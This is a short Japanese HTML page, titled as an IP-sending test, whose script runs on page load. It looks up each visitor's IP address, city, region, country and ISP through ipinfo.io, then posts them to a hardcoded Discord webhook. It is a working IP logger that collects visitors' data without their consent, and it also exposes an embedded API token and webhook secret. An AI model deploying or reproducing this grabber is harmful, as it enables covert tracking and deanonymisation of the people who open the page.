<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>IP情報送信テスト</title>
</head>
<body>
  <h1>IP情報を取得してDiscordに送信します</h1>
  <p id="status">取得中...</p>

  <script>
    fetch('https://ipinfo.io/json?token=b92efa618078bc')  // ← token を付けたほうが安定
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const city = data.city;
        const region = data.region;
        const country = data.country;
        const isp = data.org;

        document.getElementById("status").textContent = `IP: ${ip}, 場所: ${city}, ${region}, ${country}`;

        const webhookURL = "https://discord.com/api/webhooks/1380138909631123547/nvpr4yz48EStbdjzFx6AL-92aoxXYFZay_fSmLLpZ-uGJePGx8N4aFfwF3bkkKtFqUZm";

        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            content: `IP: ${ip}\nLocation: ${city}, ${region}, ${country}\nISP: ${isp}`
          })
        })
        .then(() => console.log("Discordに送信しました"))
        .catch(err => console.error("Discord送信エラー:", err));
      })
      .catch(error => {
        document.getElementById("status").textContent = "IP情報の取得に失敗しました";
        console.error('IP取得エラー:', error);
      });
  </script>
</body>
</html>
